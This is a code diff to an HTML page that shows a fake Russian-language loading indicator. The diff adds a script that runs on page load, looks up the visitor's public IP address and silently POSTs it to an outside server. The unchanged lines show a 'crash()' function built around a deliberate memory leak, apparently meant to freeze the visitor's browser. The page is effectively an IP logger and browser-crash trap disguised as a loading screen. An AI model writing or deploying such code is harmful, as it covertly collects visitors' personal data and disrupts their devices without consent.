@@ -8,9 +8,25 @@
 <p style="color: green; margin-top: 1px; margin-left: 1;" id="progressText">Загрузка... (0%)</p>
 
 <script>
+
+  
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const progressElement = document.getElementById('progressText');
 progressElement.style.display = "none";
+
+async function ipGet() {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    console.log(data.ip);
+    fetch('https://razoblaheniya.onrender.com/postapi', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ip: data.ip})
+    })
+}
+ipGet();
 
 async function crash() {
   const memoryLeak = [];
